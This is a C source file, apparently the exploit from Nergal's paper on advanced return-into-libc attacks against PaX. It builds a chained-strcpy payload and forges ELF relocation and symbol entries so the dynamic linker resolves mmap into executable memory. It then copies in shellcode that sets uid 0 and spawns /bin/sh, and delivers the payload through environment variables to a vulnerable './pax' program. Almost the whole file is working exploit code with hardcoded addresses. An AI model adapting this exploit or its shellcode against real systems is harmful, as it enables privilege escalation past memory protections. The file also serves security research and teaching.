/* by Nergal */
#include <stdio.h>
#include <stddef.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define STRCPY          0x08048374 //0x08048340
#define LEAVERET        0x804842b//0x804842b
#define FRAMESINDATA    0x8049ae0//0x8049a00

#define STRTAB          0x80481f0//0x804822c//a0x8048204
#define SYMTAB          0x8048160//0x804816c//0x8048164
#define JMPREL          0x80482b4//0x8048310//0x80482f4
#define VERSYM          0x804827a//0x80482c8//0x80482a8
#define PLT             0x08048314//0x08048380//0x0804835c

#define VIND            0x8048460
/*[VERSYM+(low_addr-SYMTAB)/8, VERSYM+(hi_addr-SYMTAB)/8]*/

#define MMAP_START      0xaa011000

char hellcode[] =
    "\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80"
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

/*
Unfortunately, if mmap_string = "mmap", accidentaly there appears a "0" in 
our payload. So, we shift the name by 1 (one 'x').
*/
#define NAME_ADD_OFF 1

char mmap_string[] = "xmmap";




struct two_arg {
        unsigned int new_ebp;
        unsigned int func;
        unsigned int leave_ret;
        unsigned int param1;
        unsigned int param2;
};
struct mmap_plt_args {
        unsigned int new_ebp;
        unsigned int put_plt_here;
        unsigned int reloc_offset;
        unsigned int leave_ret;
        unsigned int start;
        unsigned int length;
        unsigned int prot;
        unsigned int flags;
        unsigned int fd;
        unsigned int offset;
};
struct my_elf_rel {
        unsigned int r_offset;
        unsigned int r_info;
};
struct my_elf_sym {
        unsigned int st_name;
        unsigned int st_value;
        unsigned int st_size;        /* Symbol size */
        unsigned char st_info;        /* Symbol type and binding */
        unsigned char st_other;        /* ELF spec say: No defined meaning, 0 */
        unsigned short st_shndx;        /* Section index */

};


struct ourbuf {
        struct two_arg reloc;
        struct two_arg zero[8];
        struct mmap_plt_args mymmap;
        struct two_arg trans;
        char hell[sizeof(hellcode)];
        struct my_elf_rel r;
        struct my_elf_sym sym;
        char mmapname[sizeof(mmap_string)];

};

struct ov {
        char scratch[16];
        unsigned int ebp;
        unsigned int eip;
};

#define PTR_TO_NULL (VIND+1)
/* this functions prepares strcpy frame so that the strcpy call will zero
   a byte at "addr" 
*/
void fix_zero(struct ourbuf *b, unsigned int addr, int idx)
{
        b->zero[idx].new_ebp = FRAMESINDATA +
            offsetof(struct ourbuf,
            zero) + sizeof(struct two_arg) * (idx + 1);
        b->zero[idx].func = STRCPY;
        b->zero[idx].leave_ret = LEAVERET;
        b->zero[idx].param1 = addr;
        b->zero[idx].param2 = PTR_TO_NULL;
}

/* this function checks if the byte at position "offset" is zero; if so,
prepare a strcpy frame to nullify it; else, prepare a strcpy frame to 
nullify some secure, unused location */ 
void setup_zero(struct ourbuf *b, unsigned int offset, int zeronum)
{
        char *ptr = (char *) b;
        if (!ptr[offset]) {
                fprintf(stderr, "fixing zero at %i(off=%i)\n", zeronum,
                    offset);
                ptr[offset] = 0xff;
                fix_zero(b, FRAMESINDATA + offset, zeronum);
        } else
                fix_zero(b, FRAMESINDATA + sizeof(struct ourbuf) + 4,
                    zeronum);
}

/* same as above, but prepare to nullify a byte not in our payload, but at 
absolute address abs */
void setup_zero_abs(struct ourbuf *b, unsigned char *addr, int offset,
    int zeronum)
{
        char *ptr = (char *) b;
        if (!ptr[offset]) {
                fprintf(stderr, "fixing abs zero at %i(off=%i)\n", zeronum,
                    offset);
                ptr[offset] = 0xff;
                fix_zero(b, (unsigned int) addr, zeronum);
        } else
                fix_zero(b, FRAMESINDATA + sizeof(struct ourbuf) + 4,
                    zeronum);
}

int main(int argc, char **argv)
{
        char lng[sizeof(struct ov) + 4 + 1];
        char str[sizeof(struct ourbuf) + 4 + 1];
        char *env[3] = { lng, str, 0 };
        struct ourbuf thebuf;
        struct ov theov;
        int i;
        unsigned int real_index, mysym, reloc_offset;

        memset(theov.scratch, 'X', sizeof(theov.scratch));
        if (argc == 2 && !strcmp("testing", argv[1])) {
                for (i = 0; i < sizeof(theov.scratch); i++)
                        theov.scratch[i] = i + 0x10;
                theov.ebp = 0x01020304;
                theov.eip = 0x05060708;
        } else {
                theov.ebp = FRAMESINDATA;
                theov.eip = LEAVERET;
        }
        strcpy(lng, "LNG=");
        memcpy(lng + 4, &theov, sizeof(theov));
        lng[4 + sizeof(theov)] = 0;

        memset(&thebuf, 'A', sizeof(thebuf));
        real_index = (VIND - VERSYM) / 2;
        mysym = SYMTAB + 16 * real_index;
        fprintf(stderr, "mysym=0x%x\n", mysym);
        if (mysym > FRAMESINDATA
            && mysym < FRAMESINDATA + sizeof(struct ourbuf) + 16) {
                fprintf(stderr,
                    "syment intersects our payload;"
                    " choose another VIND or FRAMESINDATA\n");
                exit(1);
        }

        reloc_offset = FRAMESINDATA + offsetof(struct ourbuf, r) - JMPREL;

/* This strcpy call will relocate my_elf_sym from our payload to a fixed, 
appropriate location (mysym)
*/
        thebuf.reloc.new_ebp =
            FRAMESINDATA + offsetof(struct ourbuf, zero);
        thebuf.reloc.func = STRCPY;
        thebuf.reloc.leave_ret = LEAVERET;
        thebuf.reloc.param1 = mysym;
        thebuf.reloc.param2 = FRAMESINDATA + offsetof(struct ourbuf, sym);

        thebuf.mymmap.new_ebp =
            FRAMESINDATA + offsetof(struct ourbuf, trans);
        thebuf.mymmap.put_plt_here = PLT;
        thebuf.mymmap.reloc_offset = reloc_offset;
        thebuf.mymmap.leave_ret = LEAVERET;
        thebuf.mymmap.start = MMAP_START;
        thebuf.mymmap.length = 0x01020304;
        thebuf.mymmap.prot =
            0x01010100 | PROT_EXEC | PROT_READ | PROT_WRITE;
        thebuf.mymmap.flags =
            0x01010000 | MAP_EXECUTABLE | MAP_FIXED | MAP_PRIVATE |
            MAP_ANONYMOUS;
        thebuf.mymmap.fd = 0xffffffff;
        thebuf.mymmap.offset = 0x01021000;

        thebuf.trans.new_ebp = 0x01020304;
        thebuf.trans.func = STRCPY;
        thebuf.trans.leave_ret = MMAP_START + 1;
        thebuf.trans.param1 = MMAP_START + 1;
        thebuf.trans.param2 = FRAMESINDATA + offsetof(struct ourbuf, hell);

        memset(thebuf.hell, 'x', sizeof(thebuf.hell));
        memcpy(thebuf.hell, hellcode, strlen(hellcode));

        thebuf.r.r_info = 7 + 256 * real_index;
        thebuf.r.r_offset = FRAMESINDATA + sizeof(thebuf) + 4;
        thebuf.sym.st_name =
            FRAMESINDATA + offsetof(struct ourbuf, mmapname) 
            + NAME_ADD_OFF- STRTAB;

        thebuf.sym.st_value = FRAMESINDATA + sizeof(thebuf) + 4;
#define ANYTHING 0xfefefe80
        thebuf.sym.st_size = ANYTHING;
        thebuf.sym.st_info = (unsigned char) ANYTHING;
        thebuf.sym.st_other = ((unsigned char) ANYTHING) & ~3;
        thebuf.sym.st_shndx = (unsigned short) ANYTHING;

        strcpy(thebuf.mmapname, mmap_string);

/* setup_zero[_abs] functions prepare arguments for strcpy calls, which
are to nullify certain bytes
*/
        setup_zero(&thebuf,
            offsetof(struct ourbuf, r) + 
            offsetof(struct my_elf_rel, r_info) + 2, 0);

        setup_zero(&thebuf,
            offsetof(struct ourbuf, r) + 
            offsetof(struct my_elf_rel, r_info) + 3, 1);

        setup_zero_abs(&thebuf,
            (char *) mysym + offsetof(struct my_elf_sym, st_name) + 2,
                    offsetof(struct ourbuf, sym) + 
                offsetof(struct my_elf_sym, st_name) + 2, 2);

        setup_zero_abs(&thebuf,
            (char *) mysym + offsetof(struct my_elf_sym, st_name) + 3,
                    offsetof(struct ourbuf, sym) + 
                offsetof(struct my_elf_sym, st_name) + 3, 3);

        setup_zero(&thebuf,
            offsetof(struct ourbuf, mymmap) + 
            offsetof(struct mmap_plt_args, start), 4);

        setup_zero(&thebuf,
            offsetof(struct ourbuf, mymmap) + 
            offsetof(struct mmap_plt_args, offset), 5);

        setup_zero(&thebuf,
            offsetof(struct ourbuf, mymmap) + 
            offsetof(struct mmap_plt_args, reloc_offset) + 2, 6);

        setup_zero(&thebuf,
            offsetof(struct ourbuf, mymmap) + 
            offsetof(struct mmap_plt_args, reloc_offset) + 3, 7);

        strcpy(str, "STR=");
        memcpy(str + 4, &thebuf, sizeof(thebuf));
        str[4 + sizeof(thebuf)] = 0;
        if (sizeof(struct ourbuf) + 4 >
            strlen(str) + sizeof(thebuf.mmapname)) {
                fprintf(stderr,
                    "Zeroes in the payload, sizeof=%d, len=%d, correct it !\n",
                    sizeof(struct ourbuf) + 4, strlen(str));
                fprintf(stderr, "sizeof thebuf.mmapname=%d\n",
                    sizeof(thebuf.mmapname));
                exit(1);
        }
        execle("./pax", "pax", 0, env, 0);
        return 1;
}
